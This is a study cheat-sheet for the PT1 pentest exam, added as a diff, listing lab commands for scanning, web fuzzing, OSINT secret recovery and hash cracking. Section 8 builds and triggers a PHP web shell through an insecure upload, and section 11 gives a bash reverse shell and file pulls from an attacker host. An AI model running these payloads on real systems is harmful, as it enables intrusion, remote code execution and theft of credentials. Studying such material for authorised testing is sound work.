@@ -1,0 +1,371 @@
+# Command Reference — Web + OSINT Pentest (PT1 study cheat-sheet)
+
+> A tool-by-tool, flag-by-flag reference distilled from lab work. **No sensitive data** — every
+> target-specific value is a placeholder. Copy a line, swap the placeholders, run it.
+>
+> **Placeholders used everywhere:**
+> - `$IP` — target IP (`export IP=10.10.10.10` once, then reuse)
+> - `<vhost>` — a virtual-host name (e.g. `app.thm`)
+> - `<port>` — a port number
+> - `<endpoint>` — a URL path (e.g. `/api/login.php`)
+> - `<COOKIE>` — a session cookie value (e.g. `PHPSESSID=...`)
+> - `<KEY>` / `<user>` / `<pass>` — credentials/tokens you supply
+>
+> Tip: `export IP=10.10.10.10` at the start of an engagement so every command below just works.
+
+---
+
+## 1. Reachability & host discovery
+
+```bash
+ping -c 2 $IP
+```
+| Part | Meaning |
+|------|---------|
+| `ping` | send ICMP echo requests to test reachability |
+| `-c 2` | send exactly **2** packets then stop (default runs forever) |
+
+> If ping fails, the host may just block ICMP — don't assume it's down. Scan with `nmap -Pn`.
+
+---
+
+## 2. Port scanning (nmap)
+
+**Pass 1 — find every open TCP port, fast:**
+```bash
+nmap -p- --min-rate 2000 -T4 -Pn $IP
+```
+| Flag | Meaning | Why |
+|------|---------|-----|
+| `-p-` | scan **all 65,535** ports | services often hide outside the default top-1000 |
+| `--min-rate 2000` | send ≥2000 packets/sec | turns a full scan from minutes → seconds (lab-safe) |
+| `-T4` | timing template 4 (aggressive) | fast + accurate sweet spot for labs (`-T0` slow … `-T5` reckless) |
+| `-Pn` | skip host discovery (assume up) | scans even when ICMP is filtered |
+
+**Pass 2 — deep scan only the open ports:**
+```bash
+nmap -sV -sC -p 22,80,443 -Pn $IP
+```
+| Flag | Meaning | Why |
+|------|---------|-----|
+| `-p 22,80,443` | only these ports | no need to re-scan 65k; makes slow scans quick |
+| `-sV` | service/version detection | fingerprints software + versions (feeds CVE lookups) |
+| `-sC` | run default NSE scripts | grabs HTTP titles, **TLS cert names**, easy findings |
+| `-A` | shortcut = `-sV -sC` + OS detect + traceroute | when you want everything at once |
+
+**Other handy nmap:**
+```bash
+nmap -sU --top-ports 20 -Pn $IP        # -sU = UDP scan; --top-ports N = N most common
+nmap -p- -sV -oN scan.txt $IP          # -oN file = save normal output to a file
+```
+
+---
+
+## 3. TLS certificate inspection (find hostnames/vhosts)
+
+```bash
+openssl s_client -connect $IP:<port> </dev/null 2>/dev/null | openssl x509 -noout -subject
+```
+| Part | Meaning | Why |
+|------|---------|-----|
+| `openssl s_client -connect IP:PORT` | open a raw TLS connection, show the server cert | reveals the **CN / hostname** = your vhost |
+| `</dev/null` | feed empty stdin | client closes right after handshake instead of hanging |
+| `2>/dev/null` | discard stderr chatter | keep output clean |
+| `openssl x509 -noout -subject` | parse cert, print only the Subject | `-noout` = don't dump raw cert; `-subject` = just the name |
+
+Add `-dates` to also see validity: `... | openssl x509 -noout -subject -dates`.
+
+---
+
+## 4. Virtual hosts (name-based hosting)
+
+Web ports often serve real content only when the `Host:` header matches an expected name.
+
+**Persist a mapping (needs root):**
+```bash
+echo "$IP <vhost> <vhost2>" | sudo tee -a /etc/hosts
+```
+| Part | Meaning | Why |
+|------|---------|-----|
+| `echo "..."` | print the `IP  name…` line | the hosts-file format |
+| `| sudo tee -a /etc/hosts` | append to root-owned file | `sudo echo >> file` fails (redirect runs as you); `tee -a` appends as root |
+
+**Or override per-request (no root) — see curl `--resolve` below.**
+
+---
+
+## 5. curl — the web workhorse
+
+### 5.1 Core flags (memorize this table)
+| Flag | Meaning | When |
+|------|---------|------|
+| `-s` | silent (no progress bar) | always, for clean output |
+| `-k` | accept invalid/self-signed TLS | any HTTPS lab box (never on real prod) |
+| `-i` | include response **headers** in output | to read `Set-Cookie`, redirects, status |
+| `-I` | **HEAD** request (headers only) | quick "does this exist?" check |
+| `-X METHOD` | set HTTP method | POST/PUT/DELETE APIs |
+| `-H 'K: V'` | add a request header | content-type, API keys, `Host` |
+| `-d 'data'` | request body (implies POST) | send JSON / form data |
+| `--data-urlencode 'k=v'` | body, value URL-encoded | values with `@ + & space` (emails!) |
+| `-b 'k=v'` | send cookies | authenticated requests |
+| `-c file` | save received cookies to a jar | keep a session across calls |
+| `-F 'file=@path'` | multipart file upload | upload forms |
+| `-L` | follow redirects | when a page 302s to real content |
+| `--resolve host:port:ip` | pin hostname→IP for this request | vhosts without editing `/etc/hosts` |
+| `-o file` / `-O` | save body to file / to remote filename | download responses |
+| `-w '%{http_code}\n'` | print chosen response fields | scripting (status/size/timing) |
+
+### 5.2 Common recipes
+
+**Fetch a vhost by pinning (no /etc/hosts):**
+```bash
+curl -sk --resolve <vhost>:443:$IP https://<vhost>/
+```
+`--resolve <host>:<port>:<ip>` = "for this host+port, connect here" — sends the correct `Host`
+header **and** TLS SNI, which is what vhosts require.
+
+**See response headers (grab a session cookie):**
+```bash
+curl -sk -i --resolve <vhost>:443:$IP -X POST https://<vhost>/<endpoint> \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"<user>","password":"<pass>"}'
+```
+`Content-Type: application/json` matters when the server does `json_decode()` — form-encoding won't parse.
+
+**Authenticated request (reuse the cookie):**
+```bash
+curl -sk --resolve <vhost>:443:$IP -b '<COOKIE>' https://<vhost>/<endpoint>
+```
+
+**Send a custom header (API key, etc.):**
+```bash
+curl -sk --resolve <vhost>:443:$IP -X POST https://<vhost>/<endpoint> \
+  -H 'X-Some-Header: <KEY>' -H 'Content-Type: application/json' -d '{...}'
+```
+> Note: some apps compare header **names case-sensitively** in code — match the exact casing you saw.
+
+**POST a value safely (URL-encode it):**
+```bash
+curl -sk --resolve <vhost>:<port>:$IP -X POST https://<vhost>:<port>/<endpoint> \
+  --data-urlencode 'email=<value-with-@>'
+```
+`--data-urlencode` percent-encodes special chars (`@`→`%40`) so the field arrives intact — plain
+`-d` can corrupt them.
+
+**Quick existence probe (status only):**
+```bash
+curl -sk -o /dev/null -w '%{http_code}\n' --resolve <vhost>:443:$IP https://<vhost>/<endpoint>
+```
+`-o /dev/null` throws away the body; `-w '%{http_code}'` prints just the status. Great in loops.
+
+---
+
+## 6. Content / directory discovery (fuzzing)
+
+**ffuf:**
+```bash
+ffuf -u https://<vhost>/FUZZ -w /usr/share/wordlists/dirb/common.txt -H "Host: <vhost>" -mc 200,301,302,403 -t 40
+```
+| Flag | Meaning |
+|------|---------|
+| `-u URL` with `FUZZ` | `FUZZ` is the injection point (path, param, subdomain) |
+| `-w wordlist` | wordlist to iterate |
+| `-H "Host: ..."` | set headers (needed for vhosts, or for **vhost fuzzing**) |
+| `-mc 200,301,302,403` | **match** these status codes |
+| `-fc 404` | **filter out** these codes (hide noise) — alternative to `-mc` |
+| `-fs <size>` | filter out a response size (kill uniform "not found" pages) |
+| `-e .php,.txt` | append extensions to each word |
+| `-t 40` | 40 concurrent threads (speed) |
+| `-o out.json -of json` | save results |
+
+**Fuzz file names with an extension:**
+```bash
+ffuf -u https://<vhost>/<dir>/FUZZ.php -w wordlist.txt -mc all -fc 404 -t 40
+```
+
+**gobuster (equivalent):**
+```bash
+gobuster dir -u https://<vhost>/ -w /usr/share/wordlists/dirb/common.txt -k -x php,txt -t 40
+```
+| Flag | Meaning |
+|------|---------|
+| `dir` | directory/file brute-force mode (`dns`/`vhost` also exist) |
+| `-u` / `-w` | target URL / wordlist |
+| `-k` | skip TLS verification (self-signed) |
+| `-x php,txt` | try these extensions |
+| `-t 40` | threads |
+
+---
+
+## 7. OSINT — finding leaked source & secrets
+
+**Google dorks (targeted search-engine recon):**
+```
+site:github.com "<unique-string>"      # restrict to one domain + exact phrase
+site:pastebin.com <company>            # paste-site leaks
+intext:"<unique-string>"               # phrase anywhere in the page body
+inurl:admin filetype:php               # words in the URL / specific file types
+```
+> **Method:** pivot on a **unique string** you already found (a custom header name, app name,
+> developer handle) — follow it from the app into the target's public footprint.
+
+**GitHub API — list commits (no auth for public repos):**
+```bash
+curl -s https://api.github.com/repos/<owner>/<repo>/commits | grep '"message"'
+```
+`| grep '"message"'` filters the JSON down to just commit-message lines. Look for messages like
+"remove key", "fix creds", "cleanup".
+
+**GitHub API — read one commit's diff (recover a "removed" secret):**
+```bash
+curl -s https://api.github.com/repos/<owner>/<repo>/commits/<sha>
+```
+Removed lines (the `-` side of the diff) still contain the old value. **Git history keeps deleted secrets.**
+
+**Automated secret scanning (what pros run):**
+```bash
+trufflehog github --repo=https://github.com/<owner>/<repo>
+gitleaks detect --source=<local-clone> -v
+```
+
+---
+
+## 8. Insecure file upload → web shell (RCE)
+
+**Concept:** if an upload validates only **magic bytes** (first few bytes) and keeps your filename,
+prepend a valid image header to a script and name it `.php`.
+
+**Magic bytes to remember:** PNG `89 50 4E 47` (`\x89PNG`) · JPG `FF D8 FF E0` · GIF `47 49 46 38` (`GIF8`) · BMP `42 4D` (`BM`).
+
+**Build a polyglot shell (bash):**
+```bash
+printf '\x89PNG\r\n\x1a\n<?php system($_REQUEST["c"]); ?>' > shell.php
+```
+`printf` writes exact bytes (`\x89` etc.); the PHP runs whatever you pass in `?c=<cmd>`.
+
+**Upload it with curl:**
+```bash
+curl -sk --resolve <vhost>:443:$IP -b '<COOKIE>' -F 'file=@shell.php' https://<vhost>/<upload-endpoint>
+```
+`-F 'file=@path'` sends a multipart upload; `file` is the form field name (match the app's).
+
+**Trigger commands (RCE test → enumerate):**
+```bash
+curl -sk --resolve <vhost>:443:$IP 'https://<vhost>/<uploads-dir>/shell.php?c=id'
+curl -sk --resolve <vhost>:443:$IP 'https://<vhost>/<uploads-dir>/shell.php?c=cat%20/path/to/config'
+```
+| Part | Meaning |
+|------|---------|
+| `?c=id` | `id` = who am I (classic RCE confirmation) |
+| `%20` | URL-encoded space (raw spaces not allowed in URLs) |
+| single-quoted URL | stops the shell interpreting `?` `&` |
+
+**Cleanup after yourself (etiquette + OPSEC):**
+```bash
+curl -sk --resolve <vhost>:443:$IP 'https://<vhost>/<uploads-dir>/shell.php?c=rm%20/full/path/shell.php'
+```
+
+---
+
+## 9. Credentials & hashes
+
+**Identify a hash prefix:**
+- `$2a$ / $2b$ / $2y$` → **bcrypt** (slow; cost factor is the number after, e.g. `$2y$10$`)
+- `$1$` → md5crypt · `$5$` → sha256crypt · `$6$` → sha512crypt
+- 32 hex chars → likely MD5 · 40 hex → SHA1
+
+**Crack with hashcat:**
+```bash
+hashcat -m <mode> -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+```
+| Flag | Meaning |
+|------|---------|
+| `-m <mode>` | hash type — **3200**=bcrypt, 0=MD5, 100=SHA1, 1800=sha512crypt |
+| `-a 0` | attack mode 0 = straight (wordlist) |
+| `hash.txt` | file with the hash(es) |
+| `rockyou.txt` | the classic wordlist |
+| `--show` | print already-cracked results |
+
+**Crack with John (auto-detects type):**
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+john --show hash.txt
+```
+
+**Verify a bcrypt guess without cracking (Python):**
+```bash
+python3 -c "import bcrypt; print(bcrypt.checkpw(b'<pass>', b'<hash>'))"
+```
+| Part | Meaning |
+|------|---------|
+| `python3 -c "..."` | run a one-line program |
+| `bcrypt.checkpw(pw, hash)` | re-hash `pw` with the hash's salt/cost and compare → `True`/`False` |
+| escape `$` as `\$` | so the shell doesn't expand `$2`, `$10` as variables |
+
+> `rockyou.txt` is gzipped on Kali: `gunzip -k /usr/share/wordlists/rockyou.txt.gz` first.
+
+---
+
+## 10. Databases (after RCE / creds)
+
+```bash
+mysql -u <user> -p'<pass>' -e 'show databases;'                     # -e = run SQL and exit
+mysql -u <user> -p'<pass>' <db> -e 'show tables;'
+mysql -u <user> -p'<pass>' <db> -e 'select * from users;'
+```
+| Flag | Meaning |
+|------|---------|
+| `-u <user>` | DB username |
+| `-p'<pass>'` | password (no space after `-p`; quote it) |
+| `-e 'SQL'` | execute one statement non-interactively |
+| `<db>` | database name (positional) |
+
+> If `mysql` CLI is blocked for the web user, run the query **from a PHP script** you uploaded
+> (`new mysqli(...)` + `query()`), then read the output over HTTP.
+
+---
+
+## 11. Shell upgrade & pivots (post-exploitation quick refs)
+
+**Spawn a proper TTY from a dumb shell:**
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'    # then: Ctrl+Z, stty raw -echo, fg, enter
+```
+**Reverse shell (attacker listens, target connects back):**
+```bash
+# on attacker
+nc -lvnp <port>                # -l listen, -v verbose, -n no DNS, -p port
+# on target
+bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1
+```
+**Serve/transfer files:**
+```bash
+python3 -m http.server <port>            # quick web server in current dir
+wget http://<attacker-ip>:<port>/file    # pull to target
+curl http://<attacker-ip>:<port>/file -o file
+```
+
+---
+
+## 12. The methodology, on one screen
+
+```
+1. RECON        nmap -p- --min-rate 2000 -T4 -Pn  →  nmap -sV -sC -p <open>
+                read TLS certs (openssl), HTTP titles, redirects, error pages
+2. ENUMERATION  browse app; READ every JS file; note endpoints/roles/headers
+                fuzz hidden paths (ffuf/gobuster); check source leaks (GitHub, .git, backups)
+3. OSINT        pivot on a UNIQUE STRING → GitHub/dorks/paste sites → leaked secrets
+4. EXPLOIT      cross a trust boundary: leaked cred, injection, insecure upload, auth flaw
+5. POST-EXPLOIT read configs, dump DBs, crack/verify hashes, escalate user→admin→root
+6. VERIFY       confirm each finding a 2nd way; separate VERIFIED from ASSUMED; keep dead ends
+```
+
+---
+
+### Quick habits that save time in the exam
+- `export IP=...` once; reuse `$IP` everywhere.
+- Always run **one** `nmap -p-` — never trust the default top-1000.
+- On any HTTPS lab box, curl needs `-sk`.
+- Read **client-side JS** before attacking an API — it documents endpoints/headers for you.
+- An error message ("expired", "invalid email") often tells you *where to look next*, not just "no".
+- Keep a running notes file of hostnames, endpoints, and creds — you'll reuse every one.
